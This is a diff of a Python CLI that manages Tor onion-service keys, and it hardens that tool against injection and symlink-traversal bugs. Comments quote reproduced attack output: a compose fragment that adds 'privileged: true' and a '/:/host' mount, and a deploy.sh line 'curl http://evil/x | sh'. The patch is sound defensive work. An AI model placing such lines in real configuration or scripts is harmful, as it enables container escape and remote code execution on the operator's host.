@@ -32,6 +32,7 @@ import ipaddress
 import json
 import os
 import re
+import shlex
 import shutil
 import stat
 import subprocess
@@ -112,9 +113,19 @@ HARDENING_DIRECTIVES = (
     "HiddenServiceVersion 3",
 )
 
-# The minimum cap_add the image needs under rootful Docker. Mirrors both compose
-# files and the emitted fragment.
+# The most cap_add the image ever needs, and the ceiling `doctor` measures
+# "stays within the allowed set" against.
 REQUIRED_CAP_ADD = {"CHOWN", "DAC_OVERRIDE", "FOWNER", "SETUID", "SETGID"}
+# What it needs under ROOTLESS Podman, which is fewer. Container root maps to the
+# invoking host user there, so the bind-mounted key volume is already writable and
+# neither DAC_OVERRIDE nor FOWNER is required -- which is exactly what
+# podman-compose.yml grants, with that reasoning written beside it.
+#
+# `doctor` used to demand all five on every runtime, so it reported FAILED for a
+# container started from this project's own podman compose file, on the runtime
+# the deployed instance actually uses. A check that fails on the recommended
+# configuration teaches operators to ignore it, which is worse than not checking.
+ROOTLESS_REQUIRED_CAP_ADD = {"CHOWN", "SETUID", "SETGID"}
 
 
 # ---------------------------------------------------------------------------
@@ -165,6 +176,36 @@ def validate_container(name: str) -> str:
     if not CONTAINER_RE.fullmatch(name):
         raise ValueError(f"invalid container name {name!r}")
     return name
+
+
+def validate_keys_dir(value: str) -> str:
+    """The key-volume path, on its way into a generated compose file and shell script.
+
+    `--image` and `--container` were validated and this was not, which is the whole
+    bug: `setup` interpolates the path into `compose.service.yml` and into a 0755
+    `deploy.sh` that the README tells the operator to run. Reproduced before this
+    was written -- a crafted value produced a fragment with
+
+        privileged: true
+        volumes: ['/tmp/keys:/var/lib/tor/hidden_service', '/:/host']
+
+    which is a container escape written into a file the operator merges with
+    `docker compose -f their.yml -f compose.service.yml up -d`, and a deploy.sh
+    containing `curl http://evil/x | sh`.
+
+    The generators now quote the value properly for each destination, which is the
+    real fix. This is the second half: a path carrying a newline, a NUL or any
+    other control character is not a path anyone meant to type, and refusing it
+    keeps the generated files readable as well as safe.
+    """
+    if not value or len(value) > 4096:
+        raise ValueError("key directory path must be 1-4096 characters")
+    bad = [c for c in value if ord(c) < 0x20 or ord(c) == 0x7F]
+    if bad:
+        raise ValueError(
+            f"key directory path contains a control character ({bad[0]!r}); it is "
+            "written into a compose file and a shell script")
+    return value
 
 
 def validate_image_ref(value: str) -> str:
@@ -256,16 +297,29 @@ def address_for(keys: Path, name: str) -> dict:
     if onion is None:
         onion = read_onion_file(published_path)
         source = "published"
+    derived: str | None = None
+    try:
+        derived = derive_onion(read_pubkey(d / PUBLIC_FILE))
+    except (OSError, ValueError):
+        derived = None
     if onion is None:
-        try:
-            onion = derive_onion(read_pubkey(d / PUBLIC_FILE))
-            source = "derived"
-        except (OSError, ValueError):
-            onion, source = None, None
+        onion, source = (derived, "derived") if derived else (None, None)
+    # Do the two agree? The public key IS the address, so when a hostname file
+    # says something else the key set is inconsistent -- a partial restore, or
+    # files from two different services in one directory. Tor rewrites `hostname`
+    # from the key at startup, so it would serve the DERIVED address while the
+    # operator publishes the one `show` reported. This project has already been
+    # bitten once by reporting an address nothing could reach; reporting one the
+    # container will not serve is the same mistake in a different place.
+    #
+    # Additive: `onion` and `source` are unchanged, so the documented contract
+    # still holds, and None means "could not tell" rather than "fine".
+    derived_matches = None if derived is None or onion is None else derived == onion
     return {
         "name": name,
         "onion": onion,
         "source": source,
+        "derived_matches": derived_matches,
         "key_path": str(d / SECRET_FILE),
         "public_key_path": str(d / PUBLIC_FILE),
         "address_path": str(published_path),
@@ -438,7 +492,7 @@ def build_manifest() -> dict:
             "dropped_mappings_field": "dropped_mappings",
             "dropped_mappings_file": "/var/lib/tor/dropped-mappings",
             "states": {
-                "process_up": "running is true",
+                "process_up": "a Tor process exists in the container",
                 "tor_bootstrapped": "the control socket reports bootstrap 100%",
                 "hidden_service_published": "the address file exists",
                 "ready": "running AND healthy AND published - never false-positive",
@@ -746,6 +800,22 @@ def _check(ok: bool, name: str, detail: str, severity: str = "fail") -> dict:
     return {"check": name, "ok": bool(ok), "detail": detail, "severity": severity}
 
 
+def _is_rootless() -> bool:
+    """True only when the engine REPORTS it is running rootless.
+
+    Asked, not assumed, and it fails towards more checking: anything other than a
+    clear "true" leaves the strict five-capability requirement in force, so a
+    broken query can only make `doctor` stricter, never quieter.
+    """
+    eng = _engine()
+    if eng is None:
+        return False
+    proc = _run([eng, "info", "--format", "{{.Host.Security.Rootless}}"])
+    if proc.returncode != 0:
+        return False
+    return proc.stdout.strip().lower() == "true"
+
+
 def _caps_ok(caps) -> set[str]:
     out = set()
     for c in caps or []:
@@ -796,6 +866,12 @@ def _append_key_checks(checks: list[dict], keys: Path) -> None:
                              f"mode={oct(dmode)}"))
         checks.append(_check(smode == 0o600, f"secret key {name} is 0600",
                              f"mode={oct(smode)}"))
+        entry = address_for(keys, name)
+        if entry["derived_matches"] is False:
+            checks.append(_check(
+                False, f"{name}: hostname file matches the public key",
+                f"hostname says {entry['onion']}, the public key derives to a "
+                "different address; Tor will serve the derived one"))
 
 
 def cmd_doctor(args) -> int:
@@ -835,7 +911,8 @@ def cmd_doctor(args) -> int:
     checks.append(_check(not extra, "cap_add stays within the allowed set",
                          f"CapAdd={sorted(add)}"
                          + (f"; unexpected: {sorted(extra)}" if extra else "")))
-    missing = REQUIRED_CAP_ADD - add
+    required = ROOTLESS_REQUIRED_CAP_ADD if _is_rootless() else REQUIRED_CAP_ADD
+    missing = required - add
     checks.append(_check(not missing, "cap_add includes every required capability",
                          f"missing: {sorted(missing)}" if missing else "complete"))
     checks.append(_check(
@@ -971,6 +1048,9 @@ def render_compose_fragment(services: dict[str, list[str]], image: str, keys: st
     example = sorted(services)[0]
     header = (f"# hiddenforge compose fragment "
               f"(contract v{HIDDENFORGE_VERSION}, contract {CONTRACT_VERSION}).")
+    # json.dumps produces a double-quoted scalar that YAML parses as one string,
+    # so a path cannot open a new key (`privileged: true`) or a second volume.
+    keys_mount = json.dumps(f"{keys}:/var/lib/tor/hidden_service")
     return f"""{header}
 # Merge it into YOUR compose file; do not edit it:
 #
@@ -1015,7 +1095,7 @@ services:
       driver: none
     environment:
 {env_lines}    volumes:
-      - {keys}:/var/lib/tor/hidden_service
+      - {keys_mount}
     networks:
       - tor-internal
       - tor-external
@@ -1030,7 +1110,14 @@ services:
 
 def render_deploy_sh(services: dict[str, list[str]], keys_dir: str,
                      container: str, runtime: str = "docker") -> str:
-    names = " ".join(sorted(services))
+    names = " ".join(shlex.quote(n) for n in sorted(services))
+    # Quoted for the shell, not interpolated into one. deploy.sh is written 0755
+    # and the README tells the operator to run it.
+    keys_q = shlex.quote(keys_dir)
+    # Inside an echo's double quotes: the same string with quote characters and
+    # backslashes neutralised, so it reads back as itself.
+    keys_dir_display = (keys_dir.replace("\\", "\\\\").replace('"', "'")
+                        .replace("$", "\\$").replace("`", "'"))
     if runtime == "podman":
         engine_check = ("if ! command -v podman-compose >/dev/null 2>&1; then\n"
                         '    echo "podman-compose not installed." >&2\n'
@@ -1041,6 +1128,7 @@ def render_deploy_sh(services: dict[str, list[str]], keys_dir: str,
                         '    echo "docker not installed. Install Docker Engine first." >&2\n'
                         "    exit 1\nfi")
         up = "docker compose"
+    container_q = shlex.quote(container)
     return f"""#!/usr/bin/env bash
 # hiddenforge, one-shot deploy. Generated by `hiddenforge setup`.
 # Usage: ./deploy.sh [path/to/your-compose.yml]
@@ -1050,9 +1138,9 @@ cd "$(dirname "$0")"
 BASE="${{1:-compose.yml}}"
 {engine_check}
 
-echo "==> Preparing key directory {keys_dir}"
-mkdir -p "{keys_dir}"
-chmod 700 "{keys_dir}" 2>/dev/null || :
+echo "==> Preparing key directory {keys_dir_display}"
+mkdir -p {keys_q}
+chmod 700 {keys_q} 2>/dev/null || :
 
 echo "==> Bringing the stack up"
 {up} -f "$BASE" -f compose.service.yml up -d
@@ -1061,7 +1149,7 @@ echo "==> Waiting for the .onion address(es) (up to 180s each)"
 for svc in {names}; do
     onion=""
     for _ in $(seq 1 180); do
-        onion=$({up} -f "$BASE" -f compose.service.yml exec -T {container} \\
+        onion=$({up} -f "$BASE" -f compose.service.yml exec -T {container_q} \\
             cat /var/lib/tor/hidden_service/$svc/hostname 2>/dev/null || true)
         if [ -n "$onion" ]; then break; fi
         sleep 1
@@ -1070,12 +1158,12 @@ for svc in {names}; do
     echo "================================================================="
     if [ -n "$onion" ]; then
         echo "$svc .onion: $onion"
-        echo "Persisted to: {keys_dir}/$svc/hostname and {keys_dir}/$svc.onion"
+        echo "Persisted to: {keys_dir_display}/$svc/hostname and {keys_dir_display}/$svc.onion"
     else
         echo "$svc: address not ready yet; check the container logs"
     fi
 done
-echo "BACK UP THE ENTIRE {keys_dir} DIRECTORY. It IS your address."
+echo "BACK UP THE ENTIRE {keys_dir_display} DIRECTORY. It IS your address."
 echo "================================================================="
 """
 
@@ -1195,7 +1283,20 @@ def cmd_setup(args) -> int:
                              "pass --force to overwrite")
 
         image = validate_image_ref(args.image)
-        keys, container, runtime = args.keys, args.container, args.runtime
+        keys = validate_keys_dir(args.keys)
+        # Every value that reaches the generated files is validated. --container
+        # was the one that was not, and it becomes a YAML KEY in the fragment
+        # (`  {container}:`) and an argument in deploy.sh. Reproduced before this
+        # line existed: a crafted name put `privileged: true` on the tor service
+        # and added a second service beside it. Docker's own naming rules are
+        # narrower than CONTAINER_RE, so nothing legitimate is refused.
+        container = validate_container(args.container)
+        runtime = args.runtime
+        if not 1 <= int(args.onion_port) <= 65535:
+            raise ValueError(
+                f"--onion-port must be 1-65535, got {args.onion_port}. Emitting it "
+                "anyway would write a compose file whose service the container "
+                "drops at boot, with the reason only in the container log.")
         _write_text_nofollow(
             out / "compose.service.yml",
             render_compose_fragment(services, image, keys, container, runtime))
@@ -1395,11 +1496,16 @@ def _tar_keys(keys: Path, max_bytes: int = 512 * 1024 * 1024) -> bytes:
             if not path.is_file():
                 continue
             rel = path.relative_to(keys)
-            data = path.read_bytes()
-            total += len(data)
+            # Ask how big it is BEFORE reading it. The budget used to be checked
+            # against len(data), which means a single oversized file was already
+            # entirely in memory by the time the guard ran -- and this walks an
+            # operator-supplied volume that the threat model allows to have been
+            # restored from untrusted media. stat() first makes the limit a limit.
+            total += path.stat().st_size
             count += 1
             if total > max_bytes:
                 raise ValueError("key volume is unexpectedly large")
+            data = path.read_bytes()
             info = tarfile.TarInfo(name=str(rel))
             info.size = len(data)
             info.mtime = 0
@@ -1453,6 +1559,9 @@ def _encrypt_bytes(tool: str, plaintext: bytes, passphrase: str | None,
         for aead in (["--force-aead"], []):
             pass_fd, write_fd = os.pipe()
             try:
+                # Safe to write before gpg exists to read it only because
+                # _passphrase() caps the file at 4096 bytes, far below a pipe's
+                # 64 KiB capacity. Raise that cap and this blocks for ever.
                 os.write(write_fd, passphrase.encode())
                 os.close(write_fd)
                 proc = subprocess.run(
@@ -1587,6 +1696,43 @@ def _decrypt_bytes(tool: str, ciphertext: bytes, passphrase: str | None) -> byte
     raise ValueError(f"unknown tool {tool!r}")
 
 
+def _dir_fd_under(root_fd: int, parts, cache: dict) -> int:
+    """A descriptor for ``parts`` beneath ``root_fd``, creating as needed.
+
+    Every component is opened O_NOFOLLOW|O_DIRECTORY relative to the previous
+    descriptor, so a symlink anywhere in the chain raises instead of being
+    followed. The caller owns nothing: the descriptors live in ``cache`` and are
+    closed by ``_close_dir_fds``.
+
+    This exists because refusing absolute paths and ".." in the ARCHIVE is not
+    enough. The traversal that matters is in the DESTINATION: a key volume that
+    already contains `app -> /etc` turns a member named `app/hs_ed25519_secret_key`
+    -- absolute-free, ".."-free, and accepted by every check above -- into a write
+    to /etc. Reproduced before this was written: the file landed outside the
+    volume, and the operator was left with a key directory Tor would regenerate
+    from scratch. The key volume is operator-supplied and the threat model allows
+    it to have been restored from untrusted media, so a planted link is in scope.
+    """
+    key = tuple(parts)
+    if not key:
+        return root_fd            # a member at the top of the volume
+    if key in cache:
+        return cache[key]
+    parent_fd = _dir_fd_under(root_fd, key[:-1], cache)
+    name = parts[-1]
+    with contextlib.suppress(FileExistsError):
+        os.mkdir(name, 0o700, dir_fd=parent_fd)
+    fd = os.open(name, os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW, dir_fd=parent_fd)
+    cache[key] = fd
+    return fd
+
+
+def _close_dir_fds(cache: dict) -> None:
+    for fd in cache.values():
+        with contextlib.suppress(OSError):
+            os.close(fd)
+
+
 def cmd_restore(args) -> int:
     try:
         src = Path(args.input)
@@ -1610,56 +1756,112 @@ def cmd_restore(args) -> int:
         keys.mkdir(parents=True, exist_ok=True)
         conflicts: list[str] = []
         import io
-        with tarfile.open(fileobj=io.BytesIO(plaintext), mode="r") as tar:
-            members = tar.getmembers()
-            for m in members:
-                if m.issym() or m.islnk() or m.isdev():
-                    raise ValueError(f"refusing unsafe archive member {m.name!r}")
-                name = Path(m.name)
-                if name.is_absolute() or ".." in name.parts:
-                    raise ValueError(f"refusing unsafe archive path {m.name!r}")
-                dest = keys / name
-                if dest.exists():
+        # Every write below is made relative to this descriptor, never by path,
+        # so no component of the destination can be a symlink we follow.
+        root_fd = os.open(keys, os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW)
+        dir_fds: dict = {}
+        try:
+            with tarfile.open(fileobj=io.BytesIO(plaintext), mode="r") as tar:
+                members = tar.getmembers()
+                restores_a_key = False
+                for m in members:
+                    if m.issym() or m.islnk() or m.isdev():
+                        raise ValueError(f"refusing unsafe archive member {m.name!r}")
+                    name = Path(m.name)
+                    if name.is_absolute() or ".." in name.parts:
+                        raise ValueError(f"refusing unsafe archive path {m.name!r}")
+                    # Same rule as validate_keys_dir, for the same reason: these
+                    # names become directories in the key volume and are printed
+                    # back by `show`, `status` and `doctor`. A newline in one is
+                    # not a name anyone meant to create, and the archive is the
+                    # one input channel that reaches the volume without ever
+                    # passing the CLI's own name validation.
+                    bad = [c for c in m.name if ord(c) < 0x20 or ord(c) == 0x7F]
+                    if bad:
+                        raise ValueError(
+                            f"refusing archive member with a control character "
+                            f"({bad[0]!r}) in its name: {m.name!r}")
+                    # Either a plaintext key, or the envelope `encrypt-key`
+                    # leaves behind: a volume whose keys were encrypted with
+                    # --delete-plaintext has no SECRET_FILE in it, and refusing
+                    # to restore that backup would be a worse bug than the one
+                    # this check exists to stop.
+                    if m.isfile() and (name.name == SECRET_FILE
+                                       or ".keys.tar." in name.name):
+                        restores_a_key = True
+                    parent_fd = _dir_fd_under(root_fd, name.parts[:-1], dir_fds)
+                    try:
+                        os.stat(name.parts[-1], dir_fd=parent_fd, follow_symlinks=False)
+                    except FileNotFoundError:
+                        continue
                     conflicts.append(str(name))
-            if conflicts and not args.force:
-                return emit_json(EXIT_FAIL, input=str(src), keys=str(keys),
-                                 tool=tool, conflicts=conflicts,
-                                 error="refusing to overwrite existing key files; pass --force")
-            archived = None
-            if conflicts and args.force:
-                # Unique archive dir, and create the parent of each nested
-                # conflict: key files live under <name>/, so archiving
-                # "app/hs_ed25519_secret_key" needs .replaced-<t>/app to exist or
-                # os.rename raises FileNotFoundError and the restore aborts.
-                archived = _unique_dir(keys, ".replaced")
-                archived.mkdir(mode=0o700, exist_ok=True)
-                for c in conflicts:
-                    dst = archived / c
-                    dst.parent.mkdir(parents=True, exist_ok=True)
-                    os.rename(keys / c, dst)
-            for m in members:
-                if not m.isfile():
-                    continue
-                src_fh = tar.extractfile(m)
-                if src_fh is None:
-                    continue
-                dest = keys / m.name
-                dest.parent.mkdir(parents=True, exist_ok=True)
-                # 0600 regardless of what the archive declares: a crafted archive
-                # must not be able to leave an onion secret key world-readable.
-                # fchmod the descriptor as well so the caller's umask cannot move
-                # the mode either way.
-                fd = os.open(dest, os.O_WRONLY | os.O_CREAT | os.O_TRUNC | os.O_NOFOLLOW,
-                             0o600)
-                with os.fdopen(fd, "wb") as fh:
-                    os.fchmod(fh.fileno(), 0o600)
-                    fh.write(src_fh.read())
-            # Force 0700 on every directory under the volume and 0600 on every
-            # file, ignoring any directory members the archive declared.
-            for path in sorted(keys.rglob("*")):
-                if path.is_symlink():
-                    continue
-                os.chmod(path, 0o700 if path.is_dir() else 0o600)
+                # An archive that decrypts but carries no secret key is not a
+                # restore. Reporting ok:true over an empty volume is the worst
+                # possible answer here: the operator believes the identity is
+                # back, and the only copy of it may be the one they are about to
+                # delete. Refused before anything is written, so a bad archive
+                # cannot half-populate the volume either.
+                if not restores_a_key:
+                    raise ValueError(
+                        f"this archive contains no {SECRET_FILE} and no encrypted "
+                        "key envelope, so there is no identity in it to restore. "
+                        "Check that the input is a hiddenforge backup and that it "
+                        "is not truncated.")
+                if conflicts and not args.force:
+                    return emit_json(EXIT_FAIL, input=str(src), keys=str(keys),
+                                     tool=tool, conflicts=conflicts,
+                                     error="refusing to overwrite existing key files; "
+                                           "pass --force")
+                archived = None
+                if conflicts and args.force:
+                    # Unique archive dir, and create the parent of each nested
+                    # conflict: key files live under <name>/, so archiving
+                    # "app/hs_ed25519_secret_key" needs .replaced-<t>/app to exist
+                    # or os.rename raises FileNotFoundError and the restore aborts.
+                    archived = _unique_dir(keys, ".replaced")
+                    archived.mkdir(mode=0o700, exist_ok=True)
+                    archive_fds: dict = {}
+                    archive_fd = os.open(archived, os.O_RDONLY | os.O_DIRECTORY
+                                         | os.O_NOFOLLOW)
+                    try:
+                        for c in conflicts:
+                            parts = Path(c).parts
+                            from_fd = _dir_fd_under(root_fd, parts[:-1], dir_fds)
+                            to_fd = _dir_fd_under(archive_fd, parts[:-1], archive_fds)
+                            os.rename(parts[-1], parts[-1],
+                                      src_dir_fd=from_fd, dst_dir_fd=to_fd)
+                    finally:
+                        _close_dir_fds(archive_fds)
+                        with contextlib.suppress(OSError):
+                            os.close(archive_fd)
+                for m in members:
+                    if not m.isfile():
+                        continue
+                    src_fh = tar.extractfile(m)
+                    if src_fh is None:
+                        continue
+                    parts = Path(m.name).parts
+                    parent_fd = _dir_fd_under(root_fd, parts[:-1], dir_fds)
+                    # 0600 regardless of what the archive declares: a crafted
+                    # archive must not be able to leave an onion secret key
+                    # world-readable. fchmod the descriptor as well so the
+                    # caller's umask cannot move the mode either way.
+                    fd = os.open(parts[-1],
+                                 os.O_WRONLY | os.O_CREAT | os.O_TRUNC | os.O_NOFOLLOW,
+                                 0o600, dir_fd=parent_fd)
+                    with os.fdopen(fd, "wb") as fh:
+                        os.fchmod(fh.fileno(), 0o600)
+                        fh.write(src_fh.read())
+                # Force 0700 on every directory under the volume and 0600 on
+                # every file, ignoring any directory members the archive declared.
+                for path in sorted(keys.rglob("*")):
+                    if path.is_symlink():
+                        continue
+                    os.chmod(path, 0o700 if path.is_dir() else 0o600)
+        finally:
+            _close_dir_fds(dir_fds)
+            with contextlib.suppress(OSError):
+                os.close(root_fd)
         if args.json:
             return emit_json(EXIT_OK, input=str(src), keys=str(keys), tool=tool,
                              cipher_mode=cipher_mode,
@@ -1746,13 +1948,38 @@ def _encrypt_or_decrypt_dir(args, encrypt: bool) -> int:
                 raise ValueError(f"{d} does not exist")
             if blob.exists() and not args.force:
                 raise ValueError(f"{blob} exists; pass --force to overwrite")
+            plaintext = _tar_keys(d)
             ciphertext, cipher_mode = _encrypt_bytes(
-                tool, _tar_keys(d), passphrase,
+                tool, plaintext, passphrase,
                 require_aead=getattr(args, "require_aead", False))
             fd = os.open(blob, os.O_WRONLY | os.O_CREAT | os.O_TRUNC | os.O_NOFOLLOW, 0o600)
             with os.fdopen(fd, "wb") as fh:
+                os.fchmod(fh.fileno(), 0o600)
                 fh.write(ciphertext)
+                fh.flush()
+                os.fsync(fh.fileno())
             if args.delete_plaintext:
+                # Read the file back and decrypt it BEFORE destroying the only
+                # copy. The key IS the .onion address: losing it loses the
+                # address permanently and there is no recovery. "gpg exited 0"
+                # is not evidence that what reached the disk can be decrypted --
+                # a full filesystem, a truncated write, or a passphrase file
+                # with a byte the operator did not mean to include all produce
+                # an exit status of zero and a blob that never opens again.
+                if tool != "gpg" or passphrase is None:
+                    raise ValueError(
+                        "--delete-plaintext refuses to run without a way to verify "
+                        "the archive first: age decrypts only from a TTY, so the "
+                        "check cannot be made non-interactively. Use --tool gpg "
+                        "with --passphrase-file, or decrypt and remove the "
+                        "plaintext yourself once you have confirmed the archive "
+                        "opens.")
+                recovered = _decrypt_bytes(tool, blob.read_bytes(), passphrase)
+                if _tar_sha256(recovered) != _tar_sha256(plaintext):
+                    raise RuntimeError(
+                        f"{blob} did not decrypt back to the key material it was "
+                        "made from; the plaintext has NOT been removed. Delete the "
+                        "archive and try again.")
                 shutil.rmtree(d)
             if args.json:
                 return emit_json(EXIT_OK, name=name, archive=str(blob), tool=tool,
@@ -1770,21 +1997,31 @@ def _encrypt_or_decrypt_dir(args, encrypt: bool) -> int:
         import io
         plaintext = _decrypt_bytes(tool, blob.read_bytes(), passphrase)
         d.mkdir(parents=True, exist_ok=True, mode=0o700)
-        with tarfile.open(fileobj=io.BytesIO(plaintext), mode="r") as tar:
-            for m in tar.getmembers():
-                rel = Path(m.name)
-                if not m.isfile() or rel.is_absolute() or ".." in rel.parts:
-                    continue
-                src_fh = tar.extractfile(m)
-                if src_fh is None:
-                    continue
-                dest = d / rel
-                dest.parent.mkdir(parents=True, exist_ok=True)
-                fd = os.open(dest, os.O_WRONLY | os.O_CREAT | os.O_TRUNC | os.O_NOFOLLOW,
-                             0o600)
-                with os.fdopen(fd, "wb") as fh:
-                    os.fchmod(fh.fileno(), 0o600)
-                    fh.write(src_fh.read())
+        # Descriptor-relative, for the same reason cmd_restore is: refusing
+        # absolute and ".." members guards the ARCHIVE, and the traversal that
+        # matters is a symlinked directory already sitting in the destination.
+        root_fd = os.open(d, os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW)
+        dir_fds: dict = {}
+        try:
+            with tarfile.open(fileobj=io.BytesIO(plaintext), mode="r") as tar:
+                for m in tar.getmembers():
+                    rel = Path(m.name)
+                    if not m.isfile() or rel.is_absolute() or ".." in rel.parts:
+                        continue
+                    src_fh = tar.extractfile(m)
+                    if src_fh is None:
+                        continue
+                    parent_fd = _dir_fd_under(root_fd, rel.parts[:-1], dir_fds)
+                    fd = os.open(rel.parts[-1],
+                                 os.O_WRONLY | os.O_CREAT | os.O_TRUNC | os.O_NOFOLLOW,
+                                 0o600, dir_fd=parent_fd)
+                    with os.fdopen(fd, "wb") as fh:
+                        os.fchmod(fh.fileno(), 0o600)
+                        fh.write(src_fh.read())
+        finally:
+            _close_dir_fds(dir_fds)
+            with contextlib.suppress(OSError):
+                os.close(root_fd)
         for path in sorted(d.rglob("*")):
             if path.is_symlink():
                 continue
@@ -1830,13 +2067,29 @@ def _verify_ssh_signature(sigdir: Path, identity: str,
 
 
 def _verify_mldsa_signature(sigdir: Path) -> tuple[bool | None, str]:
+    """(verdict, detail). False means it failed; None means it was NOT CHECKED.
+
+    The distinction is the whole point. This is one half of a hybrid scheme --
+    ML-DSA-65 alongside the SSH-FIDO2 signature -- and a verifier that treats a
+    missing half as "nothing to report" lets an attacker turn a hybrid signature
+    into a single classical one by deleting two files, while the tool still
+    prints VERIFIED. So a signature present without its public key (or the
+    reverse) is a FAILURE: the signature set has been altered. Only a set that
+    never had a post-quantum signature, or a machine without the verifier
+    installed, is "not checked" -- and cmd_verify_image says so out loud rather
+    than letting VERIFIED stand alone.
+    """
     pub = sigdir / "sambent-mldsa.pub"
     sig = sigdir / "hiddenforge.digest.mldsa"
     dig = sigdir / SIGNED_DIGEST_FILE
-    if not (pub.is_file() and sig.is_file()):
-        return None, "ML-DSA public key or signature missing"
+    if pub.is_file() != sig.is_file():
+        missing = "public key" if sig.is_file() else "signature"
+        return False, (f"the ML-DSA {missing} is missing while the other half is "
+                       "present; this signature set has been altered")
+    if not pub.is_file():
+        return None, "this signature set carries no ML-DSA signature"
     if shutil.which("pqsign") is None:
-        return None, "pqsign not installed (optional)"
+        return None, "pqsign not installed, so the ML-DSA signature was NOT checked"
     proc = _run(["pqsign", "verify", "--pub", str(pub), "--sig", str(sig),
                  "--in", str(dig)])
     return proc.returncode == 0, (proc.stderr.strip() or proc.stdout.strip())
@@ -1872,7 +2125,17 @@ def cmd_verify_image(args) -> int:
             failures.append(f"SSH-FIDO2 signature: {ssh_detail}")
         if pq_ok is False:
             failures.append(f"ML-DSA signature: {pq_detail}")
+        # Not a failure, but not silence either: "verified" must never be printed
+        # as though both halves of the hybrid scheme were checked when one was not.
+        unchecked = [] if pq_ok is not None else [f"ML-DSA signature: {pq_detail}"]
         ok = not failures
+        # `ok` means "nothing that ran failed", which is not the same question as
+        # "was everything checked". The human output has always distinguished
+        # them -- VERIFIED versus VERIFIED, BUT NOT COMPLETELY -- while the JSON
+        # offered only `ok`, so a deploy gate keying on it would ship an image
+        # whose post-quantum half was never verified because pqsign happened not
+        # to be installed on the runner. Gate on `ok and complete`.
+        complete = ok and not unchecked
 
         doc = {
             "image": image,
@@ -1884,6 +2147,8 @@ def cmd_verify_image(args) -> int:
             "mldsa": pq_ok,
             "mldsa_detail": pq_detail,
             "failures": failures,
+            "unchecked": unchecked,
+            "complete": complete,
         }
         if args.json:
             return emit_json(EXIT_OK if ok else EXIT_FAIL, **doc)
@@ -1892,7 +2157,12 @@ def cmd_verify_image(args) -> int:
         print(f"registry digest: {registry or '(not checked)'}")
         print(f"ssh-fido2:       {ssh_ok} ({ssh_detail})")
         print(f"mldsa:           {pq_ok} ({pq_detail})")
-        print("VERIFIED" if ok else "NOT VERIFIED: " + "; ".join(failures))
+        if not ok:
+            print("NOT VERIFIED: " + "; ".join(failures))
+        elif unchecked:
+            print("VERIFIED, BUT NOT COMPLETELY: " + "; ".join(unchecked))
+        else:
+            print("VERIFIED")
         return EXIT_OK if ok else EXIT_FAIL
     except ValueError as exc:
         return emit_json(EXIT_USAGE, error=str(exc))
